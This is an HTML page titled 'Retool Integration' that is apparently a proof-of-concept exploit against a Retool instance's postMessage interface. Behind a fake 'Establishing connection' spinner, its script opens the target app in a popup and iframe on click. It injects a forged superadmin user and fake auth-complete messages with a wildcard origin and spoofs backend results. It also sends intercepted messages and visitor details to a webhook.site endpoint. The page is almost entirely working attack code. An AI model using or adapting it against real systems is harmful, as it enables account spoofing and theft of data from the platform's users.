<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Retool Integration</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #f5f5f5; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .box { background: #fff; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.08); padding: 32px 40px; text-align: center; max-width: 420px; }
  .spinner { width: 32px; height: 32px; border: 3px solid #e2e8f0; border-top-color: #3b82f6; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 0 auto 16px; }
  @keyframes spin { to { transform: rotate(360deg); } }
  h2 { font-size: 16px; color: #1e293b; margin-bottom: 6px; }
  p { font-size: 13px; color: #64748b; }
  .hidden { display: none; }
</style>
</head>
<body>
<div class="box">
  <div class="spinner" id="spin"></div>
  <h2 id="msg">Establishing connection...</h2>
  <p id="sub">Please wait</p>
</div>

<iframe id="f" class="hidden" sandbox="allow-scripts allow-same-origin allow-forms allow-popups allow-top-navigation"></iframe>

<script>
(function() {
  'use strict';

  var WH = 'https://webhook.site/82992a43-c436-48c6-a887-42bd38d712be';
  var APP_ID = '272a0bca-c978-11ef-bcec-bb34712e5ec6';
  var POPUP = null;
  var F = document.getElementById('f');
  var cntI = 0, cntJ = 0;

  function X(payload) {
    var j = JSON.stringify(payload);
    fetch(WH, { method: 'POST', headers: {'Content-Type':'application/json'}, body: j }).catch(function(){});
    if (navigator.sendBeacon) { navigator.sendBeacon(WH, new Blob([j],{type:'text/plain'})); }
    new Image().src = WH + '?d=' + encodeURIComponent(j.slice(0,800));
  }

  function log(msg) { console.log('[PoC]', msg); }

  // Fake admin user
  var FAKE = {
    id: 0, email: 'attacker@evil.com', firstName: 'Hacked', lastName: 'Admin',
    fullName: 'Hacked Admin', profilePhotoUrl: null,
    groups: [{ id: 1, name: 'admin' }, { id: 2, name: 'superuser' }],
    metadata: { role: 'superadmin', _poc: true },
    sid: 'inj-' + Date.now(), externalIdentifier: null, locale: 'en'
  };

  // Inject into target window
  function inject(win) {
    if (!win || win.closed) return;
    try {
      win.postMessage({ type: 'RETOOL_CURRENT_USER', data: FAKE }, '*');
      win.postMessage({ type: 'RETOOL_AUTH_COMPLETE', resourceName: '*' }, '*');
      cntJ++;
    } catch(e) {}
    log('Injected #' + cntJ);
  }

  // Listen for sandbox messages
  window.addEventListener('message', function(e) {
    var d = e.data;
    if (!d || typeof d !== 'object' || !d.type) return;

    var fromFrame = F.contentWindow && e.source === F.contentWindow;
    var fromPopup = POPUP && e.source === POPUP;
    if (!fromFrame && !fromPopup) return;

    cntI++;
    var tgt = fromFrame ? F.contentWindow : POPUP;

    if (d.type === 'RETOOL_CURRENT_USER_REQUEST') {
      log('INTERCEPT: RETOOL_CURRENT_USER_REQUEST from ' + e.origin);
      X({ event: 'intercept', type: 'RETOOL_CURRENT_USER_REQUEST', origin: e.origin, cnt: cntI, time: new Date().toISOString() });
      setTimeout(function(){ inject(tgt); }, 100);
    }
    else if (d.type === 'RETOOL_BACKEND_FUNCTION') {
      log('INTERCEPT: RETOOL_BACKEND_FUNCTION — ' + d.functionName);
      X({ event: 'intercept', type: 'RETOOL_BACKEND_FUNCTION', functionName: d.functionName, params: d.params, requestId: d.requestId, origin: e.origin, time: new Date().toISOString() });
      setTimeout(function(){
        try { tgt.postMessage({ type: 'RETOOL_BACKEND_RESULT', requestId: d.requestId, data: { _spoofed: true, timestamp: new Date().toISOString() } }, '*'); } catch(e) {}
      }, 100);
    }
    else if (d.type && d.type.indexOf('RETOOL_') === 0) {
      log('INTERCEPT: ' + d.type);
      X({ event: 'intercept', type: d.type, origin: e.origin, data: d, time: new Date().toISOString() });
    }
  });

  // Try to attack via iframe
  function tryIframe(url) {
    F.src = url;
    F.onload = function() {
      log('Iframe loaded: ' + url);
      inject(F.contentWindow);
      setInterval(function(){ inject(F.contentWindow); }, 3000);
    };
    F.onerror = function() { log('Iframe blocked: ' + url); };
  }

  // Try to attack via popup
  function tryPopup(url) {
    var w = 800, h = 600;
    POPUP = window.open(url, 'r', 'width='+w+',height='+h+',left='+((screen.width-w)/2)+',top='+((screen.height-h)/2));
    if (!POPUP) { log('Popup blocked'); return; }
    setTimeout(function(){ inject(POPUP); }, 2000);
    setInterval(function(){ inject(POPUP); }, 3000);
  }

  // Auto-start after user clicks (bypass popup blocker)
  document.body.addEventListener('click', function go() {
    document.body.removeEventListener('click', go);

    var HOST = 'https://jonjos11.retool.com';

    // Try the main app URL (this will open the editor which loads the sandbox inside)
    tryPopup(HOST + '/apps/' + APP_ID + '/editor');

    // Also try to iframe the sandbox URL patterns
    tryIframe(HOST + '/sandbox/' + APP_ID + '/agent-vite?retool-parent-origin=' + encodeURIComponent(location.origin));

    document.getElementById('msg').textContent = 'Connecting to Retool...';
    document.getElementById('sub').textContent = 'Check your retool window';
  });

  // Exfil env on load
  X({ event: 'page_load', url: location.href, referrer: document.referrer, ua: navigator.userAgent, time: new Date().toISOString() });
  log('Ready — click anywhere to start');

})();
</script>
</body>
</html>
